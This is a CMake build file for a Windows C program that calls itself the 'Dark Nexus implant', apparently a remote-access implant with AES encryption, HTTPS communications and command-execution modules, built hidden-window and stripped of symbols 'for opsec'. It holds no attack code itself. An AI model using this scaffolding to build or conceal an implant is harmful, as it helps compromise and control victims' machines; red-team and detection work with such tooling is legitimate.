cmake_minimum_required(VERSION 3.16)
project(darknexus-implant C)

set(CMAKE_C_STANDARD 11)

# Windows-only target
if(NOT WIN32)
    message(FATAL_ERROR "Dark Nexus implant builds on Windows only (requires WinHTTP, BCrypt)")
endif()

# Release build by default (strip debug info for opsec)
if(NOT CMAKE_BUILD_TYPE)
    set(CMAKE_BUILD_TYPE Release)
endif()

# Compiler flags
if(MSVC)
    # MSVC: optimize for size, no debug info, link CRT statically
    set(CMAKE_C_FLAGS_RELEASE "/O1 /Os /DNDEBUG /MT")
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "/SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup")
    add_compile_options(/W4 /WX)
else()
    # MinGW: optimize for size, strip symbols, static link
    set(CMAKE_C_FLAGS_RELEASE "-Os -s -DNDEBUG")
    set(CMAKE_EXE_LINKER_FLAGS_RELEASE "-mwindows -static -s")
    add_compile_options(-Wall -Wextra -Werror)
endif()

# Source files
set(IMPLANT_SOURCES
    src/main.c
    src/crypto/aes.c
    src/comms/https.c
    src/commands/cmd_exec.c
)

# Build the implant executable
add_executable(darknexus ${IMPLANT_SOURCES})

# Link required Windows libraries
target_link_libraries(darknexus
    winhttp
    bcrypt
    iphlpapi
    advapi32
    ws2_32
)

# Include directories
target_include_directories(darknexus PRIVATE src)

# Custom target to show build info
add_custom_command(TARGET darknexus POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "Dark Nexus implant built: $<TARGET_FILE:darknexus>"
)
